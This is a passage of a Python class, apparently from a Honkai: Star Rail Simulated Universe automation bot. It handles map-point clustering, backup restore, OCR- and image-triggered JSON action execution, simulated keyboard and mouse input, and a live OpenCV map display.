                        # CUS_LOGGER.debug(f"原始位置{(i,j)}，加权位置{p},类型{k}")
                        nep=tuple(re_get_position((p[1]+x,p[0]+y),re=True))
                        # CUS_LOGGER.debug(f"映射坐标{nep}")
                        res.add((nep, k))
                        p = (int(p[0]), int(p[1]))
                        #引用传递，会影响img源图像
                        self.del_pt(img, p, p, f_set[k])
                        if k == 3:
                            #记录终点
                            self.last = p

        # 聚类合并相近点
        if len(res) > 1:
            # 按类型分组
            groups = {}
            for p in res:
                groups.setdefault(p[1], []).append(p)

            # 对每组进行距离聚类
            merged = []
            for pts in groups.values():
                if len(pts) <= 1:
                    merged.extend(pts)
                    continue

                # 聚类逻辑
                used, clusters = set(), []
                for i, p1 in enumerate(pts):
                    if i in used:
                        continue
                    cluster = [p1]
                    used.add(i)
                    for j, p2 in enumerate(pts[i+1:], i+1):
                        if j not in used and get_dis(p1[0], p2[0]) < 5:
                            cluster.append(p2)
                            used.add(j)
                    clusters.append(cluster)

                # 选择代表点
                for c in clusters:
                    rep = min(c, key=lambda x: get_dis(x[0], self.last)) if hasattr(self, 'last') else c[0]
                    merged.append(rep)
            CUS_LOGGER.debug(f"聚类合并: {len(res)}-> {len(merged)}")
            res = set(merged)
        if self.speed:
            dis = 1000000
            pt = None
            #找到终点
            for i in res:
                if i[1] == 1 and get_dis(i[0], self.last) < dis:
                    dis = get_dis(i[0], self.last)
                    pt = i
            #将除了终点外的所有路径点改为类型0
            for i in deepcopy(res):
                if i[1] == 1 and pt != i:
                    res.remove(i)
                    res.add((i[0], 0))
        return res



    def restore_map(self):
        """
        从磁盘文件恢复地图数据

        从磁盘文件中读取并恢复之前备份的地图数据和相关属性，包括：
        1. 从PNG图像文件恢复地图图像数据(big_map)
        2. 从JSON文件恢复其他地图相关属性

        备份文件从项目目录下的config/backup文件夹中读取。
        """
        try:
            backup_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config", "backup")

            # 从磁盘读取 big_map 图像文件
            backup_file = os.path.join(backup_dir, "big_map_backup.png")
            if os.path.exists(backup_file):
                self.big_map = cv.imread(backup_file, cv.IMREAD_GRAYSCALE)

            # 从磁盘读取其他属性
            attrs_file = os.path.join(backup_dir, "map_attrs_backup.json")
            if os.path.exists(attrs_file):
                with open(attrs_file) as f:
                    backup_data = json.load(f)

                self.big_map_init = backup_data.get('big_map_init', self.big_map_init)
                self.now_loc = tuple(backup_data.get('now_loc', self.now_loc))
                self.mini_state = backup_data.get('mini_state', self.mini_state)
                self.first_mini = backup_data.get('first_mini', self.first_mini)
        except Exception:
            pass




    def goto_herta_office(self):
        """
        前往黑塔办公室

        该函数负责自动导航到黑塔办公室，主要流程包括：
        1. 检查是否已经在办公室内
        2. 如果不在办公室，则通过地图导航到黑塔办公室
        3. 进行传送操作并移动到最终目的地

        函数会利用一系列图像识别和文本识别来确定当前位置，
        并执行相应的点击、拖拽和键盘操作来完成导航。
        """
        if self.state=="init2":
            return
        self.update_state("init")
        if self.click_text(text="模拟宇宙",box=[1231, 1360, 595, 631],click=False,allow_fail= True):
            CUS_LOGGER.info("已在办公室，打开模拟宇宙")
            key_mouse_manager.press('f')
            return
        CUS_LOGGER.info("前往黑塔办公室")
        CUS_LOGGER.info("打开地图")
        key_mouse_manager.press('m')
    def goto_survival_room(self):
        key_mouse_manager.mouse_move(15)
        key_mouse_manager.keyDown("w")
        sprint()
        key_mouse_manager.sleep(4)
        key_mouse_manager.keyUp("w")
        key_mouse_manager.wait()
        self.update_state("survival_room")

    def run_static(self, json_path=None, json_file=None, action_list=[]) -> (str,int):
        """
        执行静态动作配置文件中的动作

        根据提供的JSON配置文件或路径，查找并执行匹配的动作。
        支持基于文本或图像的触发条件，一旦匹配成功即执行相应动作序列。

        参数:
            json_path: JSON配置文件路径，如果提供则加载该文件
            json_file: 已加载的JSON配置对象，优先级高于json_path
            action_list: 指定要执行的动作列表，为空则执行所有动作

        返回值:
            tuple: (触发的动作名称, 执行结果)
                  - 触发的动作名称：空字符串表示未触发任何动作
                  - 执行结果：0表示未触发，1表示触发成功，其他值表示部分成功
        """
        if json_file is None:
            if json_path is None:
                json_file = self.default_json
            else:
                json_file = load_actions(json_path)
        # 查找指定项或者默认项
        tm=time.time()
        while time.time()-tm<2:
            men = np.mean(self.get_screen())
            if men > 12:
                break
            elif self.state!="black":
                CUS_LOGGER.info("无边的黑暗中，没有来由地，一道声音始终在耳边萦绕……")
                self.update_state("black")
        if np.mean(self.get_screen())>12 and self.state=="black":
            self.update_state(self.last_state)
        for j in action_list if len(action_list) else json_file:
            for i in json_file[j]:
                trigger = i["trigger"]
                condition = trigger.get("condition", None)
                #获取指定范围的文字
                if trigger.get("text", None):
                    text = self.ts.find_with_box(trigger["box"], redundancy=trigger.get("redundancy", 30))
                    #强制跳过或者检查是否存在子串
                    if (condition==self.state if condition is not None else True) and (len(text) and trigger["text"] in merge_text(text)):
                        CUS_LOGGER.info(f"{factor}触发并执行指令{i['name']},条件：{trigger['text']}")
                        if trigger.get("interval", None) and len(self.action_history) and self.action_history[-1] == i['name']:
                            tm=time.time()-self.action_time
                            if tm<trigger["interval"]:
                                CUS_LOGGER.warning(f"触发时间限制，距离上次触发{tm}秒，默认配置间隔为{trigger["interval"]}")
                                return i['name'], 1
                        for j in i["actions"]:
                            self.do_action(j)
                        self.action_history.append(i["name"])
                        #记录最近10个动作
                        self.action_history = self.action_history[-10:]
                        self.action_time=time.time()
                        #返回触发的名字
                        return i['name'],1
                elif trigger.get("photo", None):
                    resu=0
                    if condition==self.state if condition is not None else True:
                        if "pos" in trigger:
                            if self.check(trigger["photo"], trigger["pos"]["x"], trigger["pos"]["y"], mask=trigger.get("mask", None), threshold=trigger.get("threshold", None),use_binary=trigger.get("binary", False)):
                                CUS_LOGGER.info(f"{factor}触发并执行图像记忆切片指令,{i['name']}条件：{trigger['photo']}")
                                if trigger.get("interval", None) and len(self.action_history) and self.action_history[
                                    -1] == i['name']:
                                    tm = time.time() - self.action_time
                                    if tm < trigger["interval"]:
                                        CUS_LOGGER.warning(f"触发时间限制，距离上次触发{tm}秒，默认配置间隔为{trigger["interval"]}")
                                        return i['name'], 1
                                for j in i["actions"]:
                                    re=self.do_action(j)
                                resu=re if re is not None else resu
                                self.action_history.append(i["name"])
                                #记录最近10个动作
                                self.action_history = self.action_history[-10:]
                                self.action_time = time.time()
                                #返回触发的名字
                                return i['name'],resu
                        else:
                            if self.click_target(find_image_by_name(trigger["photo"]), threshold=trigger.get("threshold", 0.9), flag=False,click=False):
                                CUS_LOGGER.info(f"{factor}触发并执行世界全局图像记忆切片指令, {i['name']}条件:{trigger['photo']}")
                                if trigger.get("interval", None) and len(self.action_history) and self.action_history[
                                    -1] == i['name']:
                                    tm = time.time() - self.action_time
                                    if tm < trigger["interval"]:
                                        CUS_LOGGER.warning( f"触发时间限制，距离上次触发{tm}秒，默认配置间隔为{trigger["interval"]}")
                                        return i['name'], 1
                                for j in i["actions"]:
                                    re=self.do_action(j)
                                resu=re if re is not None else resu
                                self.action_history.append(i["name"])
                                #记录最近10个动作
                                self.action_history = self.action_history[-10:]
                                self.action_time = time.time()
                                #返回触发的名字
                                return i['name'],resu
        return '',0
    def do_action(self, action) -> int:
        """
        执行单个动作指令

        根据传入的动作定义执行相应的操作，支持多种类型的动作：
        1. 字符串类型：调用同名方法
        2. 文本点击类型：在指定区域内查找包含特定文本的元素并点击
        3. 位置点击类型：直接点击指定坐标位置
        4. 延时类型：执行普通延时或真实延时
        5. 按键类型：按下指定按键

        参数:
            action: 动作定义，可以是字符串或字典类型
                   - 字符串：表示要调用的方法名
                   - 字典：包含具体的动作参数，支持"text"、"position"、"sleep"、"real_sleep"、"press"等关键字

        返回值:
            int: 执行结果，1表示执行成功，0表示未执行或执行失败
        """
        if isinstance(action, str):
            return getattr(self, action)()
        if "text" in action:
            if "box" in action:
                box = action["box"]
            else:
                box = [0, 1920, 0, 1080]
            text = self.ts.find_with_box(box, redundancy=action.get("redundancy", 30))
            for i in text:
                if action["text"] in i["raw_text"]:
                    CUS_LOGGER.debug(f"点击 {action['text']}:{i['box']}")
                    self.click_box(i["box"])
                    return 1
        if "photo" in action:
            self.click_target(find_image_by_name(action["photo"]), action.get("threshold", 0.9), flag=False,click=True)
            return 1
        elif "position" in action:
            CUS_LOGGER.debug(f"点击 {action['position']}")
            self.click_position(action["position"])
            return 1
        elif "sleep" in action:
            key_mouse_manager.sleep(float(action["sleep"]))
            return 1
        elif "real_sleep" in action:
            time.sleep(float(action["real_sleep"]))
            return 1
        elif "press" in action:
            key_mouse_manager.press(action["press"], action["time"] if "time" in action else 0)
            return 1
        elif "drag" in action:
            key_mouse_manager.drag(action["drag"][0], action["drag"][1],action["drag"][2],action["drag"][3])
            return 1
        elif "scroll" in action:
            key_mouse_manager.scroll(action["scroll"])
            return 1
        elif "set_state" in action:
            self.update_state(action["set_state"])
            return 1
        return 0
    def show_map(self):
        """
        实时显示模拟宇宙地图的可视化窗口

        该方法在一个独立线程中运行，创建一个OpenCV窗口用于显示当前游戏地图，
        并实时更新玩家位置、目标位置和朝向等信息。主要包括以下功能：
        1. 创建可缩放且不自动聚焦的OpenCV窗口
        2. 监控角色位置、目标位置和朝向等状态变化，仅在有更新时重绘地图
        3. 在地图上绘制当前位置（绿色）、目标位置（根据类型着色）及朝向箭头
        4. 显示当前角度和目标坐标，并通过颜色变化提示角度更新时间
        5. 放大地图图像并维持合理刷新率，按'q'键退出

        注意：该方法应在单独的线程中调用，不应直接调用
        """
        try:
            # 创建窗口时使用 WINDOW_FREERATIO 标志以避免自动获取焦点
            cv.namedWindow("Map", cv.WINDOW_FREERATIO | cv.WINDOW_NORMAL)
            # 设置窗口初始大小
            win_width, win_height = 600, 600
            cv.resizeWindow("Map", win_width, win_height)
            cv.startWindowThread()
            set_forground()
            # 缓存上一次的状态，避免不必要的重绘
            last_real_loc = None
            last_target_loc = None
            last_target_type = None
            last_ang = None

            while not self._stop:
                if self.debug_map is not None:
                    pass
                elif self.big_map is None or self.now_loc is None or self.target_loc is None :
                    # 使用cv.pollKey()替代cv.waitKey()以避免阻塞
                    key = cv.pollKey()
                    if key == ord('q'):
                        break
                    time.sleep(0.1)  # 短暂休眠避免CPU占用过高
                    continue

                # 检查是否有变化，如果没有变化则跳过更新
                current_now_loc = self.now_loc
                current_target_loc = self.target_loc
                current_target_type = self.target_type
                current_ang = self.ang

                # 如果没有重要变化，则短暂等待后继续
                if (last_real_loc == current_now_loc and
                    last_target_loc == current_target_loc and
                    last_target_type == current_target_type and
                    last_ang == current_ang):
                    # 使用cv.pollKey()替代cv.waitKey()以避免阻塞
                    key = cv.pollKey()
                    if key == ord('q'):
                        break
                    time.sleep(0.1)  # 短暂休眠避免CPU占用过高
                    continue

                # 更新缓存值
                last_real_loc = current_now_loc
                last_target_loc = current_target_loc
                last_target_type = current_target_type
                last_ang = current_ang
                # 只在需要时才拷贝图像
                if self.debug_map is not None:
                    updated_image = self.debug_map.copy()
                else:
                    updated_image = self.pos_predictor.draw_position_on_map(show=False)
                    current_target_loc = re_get_position(current_target_loc)
                    current_now_loc = re_get_position(current_now_loc)
                # 初始化坐标偏移量
                x_offset = 0
                y_offset = 0
                # 检查是否存在tmp地图，如果有则与原始地图拼接
                if self.pos_map is not None:
                    tmp_colored = self.pos_map.copy()
                    # 调整图像尺寸以匹配垂直拼接的宽度
                    max_width = max(updated_image.shape[1], tmp_colored.shape[1])
                    # 调整两个图像的宽度以匹配最大宽度
                    if updated_image.shape[1] < max_width:
                        # 为updated_image添加右侧填充
                        width_diff = max_width - updated_image.shape[1]
                        left_pad = width_diff // 2
                        right_pad = width_diff - left_pad
                        updated_image = np.pad(updated_image, ((0, 0), (left_pad, right_pad), (0, 0)), mode='constant', constant_values=0)
                        x_offset = left_pad  # 更新x方向偏移量

                    elif tmp_colored.shape[1] < max_width:
                        # 对updated_image进行resize以匹配tmp_colored的宽度
                        scale_factor = tmp_colored.shape[1] / updated_image.shape[1]
                        new_height = int(updated_image.shape[0] * scale_factor)
                        updated_image = cv.resize(updated_image, (tmp_colored.shape[1], new_height), interpolation=cv.INTER_AREA)
                        max_width = tmp_colored.shape[1]  # 更新max_width为tmp_colored的宽度
                    top_spacing = 10
                    top_spacing_img = np.zeros((top_spacing, max_width, 3), dtype=np.uint8)
                    y_offset = top_spacing
                    middle_spacing = 10
                    middle_spacing_img = np.zeros((middle_spacing, max_width, 3), dtype=np.uint8)
                    # 垂直拼接：上方间距 + 小地图 + 中间间距 + 大地图
                    updated_image = np.vstack((top_spacing_img, tmp_colored, middle_spacing_img,updated_image ))
                else:
                    top_spacing = 10
                    top_spacing_img = np.zeros((top_spacing, updated_image.shape[1], 3), dtype=np.uint8)
                    down_spacing = max(0,3*updated_image.shape[1]-updated_image.shape[0])
                    if self.debug_map is None:
                        down_spacing_img = np.zeros((down_spacing, updated_image.shape[1], 3), dtype=np.uint8)
                        updated_image = np.vstack((top_spacing_img,updated_image,down_spacing_img))

                # 确保坐标值为整数类型，避免切片索引错误
                real_x, real_y = current_now_loc
                real_x = int(real_x + x_offset -self.upx)
                real_y = int(real_y + y_offset-self.upy)
                # 绘制当前位置（绿色）
                for dx in range(-2, 3):
                    for dy in range(-2, 3):
                        if (0 <= real_y + dy < updated_image.shape[0] and
                            0 <= real_x + dx < updated_image.shape[1]):
                            updated_image[real_y + dy, real_x + dx] = [49, 140, 49]
                if current_target_loc is not None:
                    target_x, target_y = current_target_loc
                    target_x = int(target_x + x_offset - self.upx)
                    target_y = int(target_y + y_offset - self.upy)
                # 调整坐标以适应图像拼接后的偏移
                    # 绘制目标位置
                    color_map = {
                        0: [140, 49, 49],  # 蓝色
                        1: [49, 49, 140],   # 红色
                        2: [49, 140, 49],   # 绿色
                        3: [49, 140, 140]   # 黄色
                    }
                    target_color = color_map.get(current_target_type, [49, 140, 140])


                    for dx in range(-2, 3):
                        for dy in range(-2, 3):
                            if (0 <= target_y + dy < updated_image.shape[0] and
                                0 <= target_x + dx < updated_image.shape[1]):
                                updated_image[target_y + dy, target_x + dx] = target_color
                    # 在左上角显示目标坐标
                    target_text = f"target: ({target_x - x_offset - self.upx}, {target_y - y_offset - self.upy})"
                    cv.putText(updated_image, target_text, (x_offset, 20),
                               cv.FONT_HERSHEY_SIMPLEX, 0.25, (0, 255, 255), 1)

                # 绘制朝向箭头
                if current_ang is not None:
                    import math
                    angle_rad = math.radians(-current_ang)
                    line_length = 20
                    end_point = (
                        int(real_x + line_length * math.cos(angle_rad)),
                        int(real_y - line_length * math.sin(angle_rad))
                    )

                    # 确保线条端点在图像范围内
                    if (0 <= real_y < updated_image.shape[0] and
                        0 <= real_x < updated_image.shape[1] and
                        0 <= end_point[1] < updated_image.shape[0] and
                        0 <= end_point[0] < updated_image.shape[1]):
                        cv.arrowedLine(
                            updated_image,
                            (real_x, real_y),  # 注意：cv.arrowedLine使用(x,y)坐标
                            end_point,
                            (0, 255, 0),
                            1,
                            tipLength=0.4
                        )

                cv.imshow("Map", updated_image)
                # 使用cv.pollKey()替代cv.waitKey()以避免阻塞
                key = cv.pollKey()
                if key == ord('q'):
                    break
                # 检查停止标志
                if self._stop:
                    break
        except Exception as e:
            raise e
        finally:
            # 无论如何都要确保窗口被关闭
            try:
                cv.destroyAllWindows()
                cv.waitKey(1)
            except Exception as e:
                CUS_LOGGER.error(f'异常关闭窗口{e}')
    def start(self):
        """
        启动模拟宇宙自动化程序

        该方法负责初始化并启动整个模拟宇宙运行流程，包括：
        1. 初始化运行状态
        2. 启动键盘鼠标管理器
        3. 启动地图显示线程（如果启用）
        4. 开始执行主要路线逻辑

        如果在执行过程中发生异常，会尝试停止运行并重新抛出异常。
        """
        self._stop = False
        key_mouse_manager.start()
        if self.record and self.gwypzmgzcndqlp:
            self.recorder.start_recording(self.count)
        if self._show_map:
            self.map_thread = ThreadWithException(target=self.show_map,name="地图")
            self.map_thread.start()
        try:
            self.route()
        except NormalEndError as e:
            CUS_LOGGER.warning(f'离开游戏界面，正常终止进程{e}')
            raise
        except Exception as e:
            CUS_LOGGER.error(f'异常终止进程{e}')
            if not self._stop:
                self.stop()
            # 重新抛出异常，以便上层能够捕获
            raise

    def stop(self, *_, **__):
        """
        停止模拟宇宙运行

        该方法负责安全地停止所有运行中的线程和操作，包括：
        1. 设置停止标志
        2. 停止键盘鼠标管理器
        3. 等待并终止地图显示线程

        参数:
            *_: 忽略的位置参数
            **__: 忽略的关键字参数
        """
        CUS_LOGGER.info("翁法罗斯已经等待了这一刻太久……还可以等待更久……只要祂还曾燃烧……")
        self._stop = 1
        key_mouse_manager.stop()
        if self.record and self.bveerelbcpgyqan :
            CUS_LOGGER.info("以「爱」的名义，她将逝去的一切尽数珍藏……直到世间的尽头……")
            try:
                self.recorder.stop_recording()
            except Exception as e:
                CUS_LOGGER.error(f"停止录制时发生错误: {e}")
        self.save_screen(not_now=True,save_path="/temp/stop/")
        self.save_screen(save_path="/temp/stop/")
        self.map_thread = None


